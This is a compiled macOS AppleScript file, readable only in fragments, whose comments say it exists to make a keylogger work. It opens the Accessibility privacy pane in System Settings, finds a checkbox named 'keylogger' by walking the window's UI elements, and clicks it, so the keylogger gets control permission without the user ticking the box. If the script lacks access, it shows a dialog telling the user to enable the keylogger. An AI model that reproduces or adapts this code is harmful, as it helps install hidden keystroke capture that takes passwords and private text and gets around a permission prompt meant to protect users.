FasdUAS 1.101.10   ��   ��    k             l      ��  ��   4.
Created by William Munnich
Apple Script to edit user settings inside of "Allow the applications below to control your computer" to allow 
the script to control your computer. If Script Editor not allowed asssistive access, then the 
script will open settings and show user how to make keylogger work.
     � 	 	\ 
 C r e a t e d   b y   W i l l i a m   M u n n i c h 
 A p p l e   S c r i p t   t o   e d i t   u s e r   s e t t i n g s   i n s i d e   o f   " A l l o w   t h e   a p p l i c a t i o n s   b e l o w   t o   c o n t r o l   y o u r   c o m p u t e r "   t o   a l l o w   
 t h e   s c r i p t   t o   c o n t r o l   y o u r   c o m p u t e r .   I f   S c r i p t   E d i t o r   n o t   a l l o w e d   a s s s i s t i v e   a c c e s s ,   t h e n   t h e   
 s c r i p t   w i l l   o p e n   s e t t i n g s   a n d   s h o w   u s e r   h o w   t o   m a k e   k e y l o g g e r   w o r k . 
   
  
 l     ��������  ��  ��        l     ��  ��    G A Function to check if assistive access is enabled for this script     �   �   F u n c t i o n   t o   c h e c k   i f   a s s i s t i v e   a c c e s s   i s   e n a b l e d   f o r   t h i s   s c r i p t      i         I      �������� (0 hasassistiveaccess hasAssistiveAccess��  ��    k            O     
    r    	    1    ��
�� 
uien  o      ���� "0 assistiveaccess assistiveAccess  m       �                                                                                  sevs  alis    \  Macintosh HD               �_<BD ����System Events.app                                              �����_<        ����  
 cu             CoreServices  0/:System:Library:CoreServices:System Events.app/  $  S y s t e m   E v e n t s . a p p    M a c i n t o s h   H D  -System/Library/CoreServices/System Events.app   / ��     ��  L       o    ���� "0 assistiveaccess assistiveAccess��         l     �� ! "��   ! F @ Check and display a message based on the assistive access state    " � # # �   C h e c k   a n d   d i s p l a y   a   m e s s a g e   b a s e d   o n   t h e   a s s i s t i v e   a c c e s s   s t a t e    $ % $ l     &���� & r      ' ( ' I     �������� (0 hasassistiveaccess hasAssistiveAccess��  ��   ( o      ���� $0 assistiveenabled assistiveEnabled��  ��   %  ) * ) l   � +���� + O    � , - , k    � . .  / 0 / O    ) 1 2 1 k    ( 3 3  4 5 4 I   ������
�� .miscactvnull��� ��� null��  ��   5  6 7 6 l   " 8 9 : 8 I   "�� ;��
�� .miscmvisnull���     **** ; n     < = < 4    �� >
�� 
xppa > m     ? ? � @ @ * P r i v a c y _ A c c e s s i b i l i t y = 5    �� A��
�� 
xppb A m     B B � C C X c o m . a p p l e . s e t t i n g s . P r i v a c y S e c u r i t y . e x t e n s i o n
�� kfrmID  ��   9 #  Change the pane ID as needed    : � D D :   C h a n g e   t h e   p a n e   I D   a s   n e e d e d 7  E�� E I  # (�� F��
�� .sysodelanull��� ��� nmbr F m   # $ G G ?�      ��  ��   2 m     H H�                                                                                  sprf  alis    T  Macintosh HD               �_<BD ����System Settings.app                                            �����_<        ����  
 cu             Applications  */:System:Applications:System Settings.app/  (  S y s t e m   S e t t i n g s . a p p    M a c i n t o s h   H D  'System/Applications/System Settings.app   / ��   0  I J I l  * *��������  ��  ��   J  K�� K Z   * � L M�� N L o   * +���� $0 assistiveenabled assistiveEnabled M k   . � O O  P Q P l  . .�� R S��   R 8 2 Check the "keylogger" checkbox if it is unchecked    S � T T d   C h e c k   t h e   " k e y l o g g e r "   c h e c k b o x   i f   i t   i s   u n c h e c k e d Q  U�� U O   . � V W V k   : � X X  Y Z Y l  : :�� [ \��   [ 3 - Change to the name of you compiled keylogger    \ � ] ] Z   C h a n g e   t o   t h e   n a m e   o f   y o u   c o m p i l e d   k e y l o g g e r Z  ^ _ ^ r   : x ` a ` n   : t b c b 4   m t�� d
�� 
chbx d m   p s e e � f f  k e y l o g g e r c n   : m g h g 4   h m�� i
�� 
uiel i m   k l����  h n   : h j k j 4   c h�� l
�� 
crow l m   f g����  k n   : c m n m 4   ^ c�� o
�� 
tabB o m   a b����  n n   : ^ p q p 4   Y ^�� r
�� 
scra r m   \ ]����  q n   : Y s t s 4   T Y�� u
�� 
sgrp u m   W X����  t n   : T v w v 4   O T�� x
�� 
scra x m   R S����  w n   : O y z y 4   J O�� {
�� 
sgrp { m   M N����  z n   : J | } | 4   E J�� ~
�� 
sgrp ~ m   H I����  } n   : E  �  4   @ E�� �
�� 
splg � m   C D����  � 4   : @�� �
�� 
sgrp � m   > ?����  a o      ���� &0 keyloggercheckbox keyloggerCheckbox _  ��� � Z   y � � ��� � � H   y � � � l  y � ����� � c   y � � � � n   y � � � � 1   | ���
�� 
valL � o   y |���� &0 keyloggercheckbox keyloggerCheckbox � m   � ���
�� 
bool��  ��   � k   � � � �  � � � I  � ��� ���
�� .prcsclicnull��� ��� uiel � o   � ����� &0 keyloggercheckbox keyloggerCheckbox��   �  ��� � I  � ��� ���
�� .sysodlogaskr        TEXT � m   � � � � � � � 4 P l e a s e   G r a n t   A u t h o r i z a t i o n��  ��  ��   � k   � � � �  � � � I  � ��� ���
�� .sysodlogaskr        TEXT � m   � � � � � � � : A u t h o r i z a t i o n   A l r e a d y   G r a n t e d��   �  � � � l  � ��� � ���   � + % Quit System Preferences if it's open    � � � � J   Q u i t   S y s t e m   P r e f e r e n c e s   i f   i t ' s   o p e n �  ��� � O   � � � � � k   � � � �  � � � I  � ��� ���
�� .sysodelanull��� ��� nmbr � m   � � � � ?�      ��   �  ��� � Z  � � � ����� � 1   � ���
�� 
prun � I  � �������
�� .aevtquitnull��� ��� null��  ��  ��  ��  ��   � m   � � � ��                                                                                  sprf  alis    T  Macintosh HD               �_<BD ����System Settings.app                                            �����_<        ����  
 cu             Applications  */:System:Applications:System Settings.app/  (  S y s t e m   S e t t i n g s . a p p    M a c i n t o s h   H D  'System/Applications/System Settings.app   / ��  ��  ��   W n   . 7 � � � 4   2 7�� �
�� 
cwin � m   3 6 � � � � �  A c c e s s i b i l i t y � 4   . 2�� �
�� 
prcs � m   0 1 � � � � �  S y s t e m   S e t t i n g s��  ��   N I  � ��� ���
�� .sysodlogaskr        TEXT � m   � � � � � � �� A s s i s t i v e   a c c e s s   i s   n o t   e n a b l e d   f o r   t h i s   s c r i p t .   P l e a s e   e n a b l e   i t   i n   S y s t e m   P r e f e r e n c e s   >   S e c u r i t y   &   P r i v a c y   >   P r i v a c y   >   A c c e s s i b i l i t y .   T h e n   c h e c k   S c r i p t   E d i t o r .   o r   s i m p l y   e n a b l e   y o u r   k e y l o g g e r ( b y   n a m e )   i n   t h e   s a m e   l o c a t i o n .��  ��   - m    	 � ��                                                                                  sevs  alis    \  Macintosh HD               �_<BD ����System Events.app                                              �����_<        ����  
 cu             CoreServices  0/:System:Library:CoreServices:System Events.app/  $  S y s t e m   E v e n t s . a p p    M a c i n t o s h   H D  -System/Library/CoreServices/System Events.app   / ��  ��  ��   *  � � � l     ��������  ��  ��   �  ��� � l     ��������  ��  ��  ��       �� � � ���   � ������ (0 hasassistiveaccess hasAssistiveAccess
�� .aevtoappnull  �   � **** � �� ���� � ����� (0 hasassistiveaccess hasAssistiveAccess��  ��   � ���� "0 assistiveaccess assistiveAccess �  ��
�� 
uien�� � *�,E�UO� � �� ����� � ���
�� .aevtoappnull  �   � **** � k     � � �  $ � �  )����  ��  ��   �   � #���� � H���� B���� ?�� G���� ��� ���������~�}�| e�{�z�y�x ��w ��v�u ��� (0 hasassistiveaccess hasAssistiveAccess�� $0 assistiveenabled assistiveEnabled
�� .miscactvnull��� ��� null
�� 
xppb
�� kfrmID  
�� 
xppa
�� .miscmvisnull���     ****
�� .sysodelanull��� ��� nmbr
�� 
prcs
�� 
cwin
�� 
sgrp
�� 
splg
�� 
scra
� 
tabB
�~ 
crow
�} 
uiel
�| 
chbx�{ &0 keyloggercheckbox keyloggerCheckbox
�z 
valL
�y 
bool
�x .prcsclicnull��� ��� uiel
�w .sysodlogaskr        TEXT
�v 
prun
�u .aevtquitnull��� ��� null�� �*j+  E�O� �� *j O*���0��/j 
O�j UO� �*��/�a / �*a k/a k/a l/a k/a k/a k/a k/a k/a l/a k/a a /E` O_ a ,a & _ j Oa j Y 'a j O� �j O*a  ,E 
*j !Y hUUY 	a "j Uascr  ��ޭ